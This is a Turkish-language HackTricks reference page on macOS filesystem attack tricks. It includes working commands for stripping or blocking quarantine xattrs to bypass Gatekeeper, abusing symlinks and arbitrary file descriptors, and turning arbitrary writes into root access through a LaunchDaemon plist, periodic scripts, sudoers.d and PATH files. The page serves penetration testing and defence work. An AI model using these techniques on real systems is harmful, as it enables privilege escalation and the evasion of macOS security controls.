# macOS FS Hileleri

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimizden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

## POSIX izin kombinasyonları

Bir **dizin** içindeki izinler:

* **okuma** - dizin girişlerini **listeleyebilirsiniz**
* **yazma** - dizindeki **dosyaları silme/yazma** yeteneğine sahip olursunuz ve **boş klasörleri silebilirsiniz**.&#x20;
* Ancak, **yazma izniniz olmadıkça dolu klasörleri silme/değiştirme** yeteneğiniz yoktur.
* Bir klasörün adını **sahip olmadıkça değiştiremezsiniz**.
* **çalıştırma** - dizini **gezebilmenize izin verir** - bu hakkınız yoksa, içindeki dosyalara veya alt dizinlere erişemezsiniz.

### Tehlikeli Kombinasyonlar

**Kök tarafından sahip olunan bir dosya/klasörü nasıl üzerine yazarız**, ancak:

* Yolun bir üst **dizin sahibi** kullanıcıdır
* Yolun bir üst **dizin sahibi**, **yazma erişimine sahip olan bir kullanıcı grubudur**
* Bir kullanıcı grubu, **dosyaya yazma** erişimine sahiptir

Yukarıdaki kombinasyonlardan herhangi biriyle, saldırgan ayrıcalıklı bir keyfi yazma elde etmek için beklenen yola bir sembolik/sabit bağ enjekte edebilir.

### Dizin kökü R+X Özel durumu

Eğer bir **dizin** içinde **yalnızca kök R+X erişimine sahipse** dosyalara **başka kimse erişemez**. Bu nedenle, bir kullanıcının okuyabileceği bir dosyayı okuyamadığı bir **kısıtlama** nedeniyle bu klasörden **başka bir klasöre** taşımak için bir zafiyet, bu dosyaları okumak için kötüye kullanılabilir.

Örnek: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Sembolik Bağlantı / Sabit Bağlantı

Eğer ayrıcalıklı bir işlem, **düşük ayrıcalıklı bir kullanıcı tarafından kontrol edilebilen** veya daha önceden düşük ayrıcalıklı bir kullanıcı tarafından **oluşturulabilen** bir **dosyaya** veri yazıyorsa, kullanıcı sadece bir Sembolik veya Sabit bağlantı aracılığıyla onu başka bir dosyaya yönlendirebilir ve ayrıcalıklı işlem o dosyaya yazacaktır.

Saldırganın ayrıcalıkları yükseltmek için keyfi yazmayı nasıl kötüye kullanabileceğini görmek için diğer bölümlere bakın.

## .fileloc

**`.fileloc`** uzantılı dosyalar, diğer uygulamalara veya ikili dosyalara işaret edebilir, böylece açıldıklarında uygulama/ikili dosya çalıştırılır.\
Örnek:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Keyfi FD

Eğer bir **işlemi yüksek ayrıcalıklarla bir dosya veya klasör açmaya zorlayabilirseniz**, **`crontab`**'ı kullanarak `/etc/sudoers.d` içindeki bir dosyayı **`EDITOR=exploit.py`** ile açabilirsiniz, böylece `exploit.py` `/etc/sudoers` içindeki dosyaya FD alacak ve onu kötüye kullanabilecektir.

Örneğin: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Karantina xattrs hilelerinden kaçınma

### Onu kaldırın
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable bayrağı

Bir dosya/dizin bu değiştirilemez özelliğe sahipse üzerine bir xattr eklemek mümkün olmayacaktır.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs bağlama

**devfs** bağlaması **xattr** desteklemez, daha fazla bilgi için [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html) sayfasına bakın.
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

Bu ACL, dosyaya `xattrs` eklenmesini engeller.
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** dosya formatı, ACE'leri de içeren bir dosyanın kopyasını oluşturur.

[**Kaynak kodunda**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) görülebileceği gibi, **`com.apple.acl.text`** adlı xattr içinde depolanan ACL metin temsili, sıkıştırılmış dosyada ACL olarak ayarlanacaktır. Bu nedenle, ACL'yi diğer xattr'ların yazılmasını engelleyen bir ACL ile birlikte bir uygulamayı zip dosyasına sıkıştırdıysanız... karantina xattr uygulamaya ayarlanmamış olacaktır:

Daha fazla bilgi için [**orijinal raporu**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) kontrol edin.

Bunu çoğaltmak için önce doğru acl dizesini elde etmemiz gerekiyor:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Not: Bu işe yarasa bile, kum havuzu önce karantina xattr'ı yazar)

Gerçekten gerekli değil ama her ihtimale karşı burada bırakıyorum:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Kod İmzalarını Atlama

Bundles, **`_CodeSignature/CodeResources`** adlı dosyayı içerir ve bu dosya, **bundle** içindeki her bir **dosyanın karma değerini** içerir. CodeResources'un karma değeri aynı zamanda **yürütülebilir dosyaya gömülüdür**, bu yüzden onunla oynamamız mümkün değildir.

Ancak, bazı dosyaların imzası kontrol edilmeyecektir, bunlar plist içinde omit anahtarına sahiptir, örneğin:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Aşağıdaki komutu kullanarak bir kaynağın imzasını hesaplamak mümkündür:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Dmg'leri Bağlama

Bir kullanıcı, mevcut bazı klasörlerin üzerine bile özel içeriğe sahip bir dmg oluşturabilir. İşte özel içeriğe sahip bir dmg paketi nasıl oluşturulacağı:

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

## Keyfi Yazılar

### Periyodik sh betikleri

Eğer betiğiniz bir **shell betiği** olarak yorumlanabilirse, her gün tetiklenecek olan **`/etc/periodic/daily/999.local`** shell betiğini üzerine yazabilirsiniz.

Bu betiği şu şekilde **sahte** bir şekilde çalıştırabilirsiniz: **`sudo periodic daily`**

### Daemonlar

Bir keyfi **LaunchDaemon** yazın, örneğin **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** adında bir plist ile keyfi bir betik çalıştırın:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
`/Applications/Scripts/privesc.sh` adlı betiği **kök olarak** çalıştırmak istediğiniz **komutlarla** oluşturun.

### Sudoers Dosyası

**Keyfi yazma** yeteneğiniz varsa, kendinize **sudo** ayrıcalıkları veren **`/etc/sudoers.d/`** klasörü içinde bir dosya oluşturabilirsiniz.

### PATH Dosyaları

**`/etc/paths`** dosyası, PATH ortam değişkenini dolduran ana yerlerden biridir. Üzerine yazmak için kök kullanıcı olmanız gerekmektedir, ancak bir **ayrıcalıklı işlem** tarafından **tam yol belirtilmeden** çalıştırılan bir betik, bu dosyayı değiştirerek onu **ele geçirmenize** olanak sağlayabilir.

&#x20;Yeni klasörleri `PATH` ortam değişkenine yüklemek için **`/etc/paths.d`** klasörüne de dosya yazabilirsiniz.

## Referanslar

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **tanıtmak** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** paylaşın.

</details>
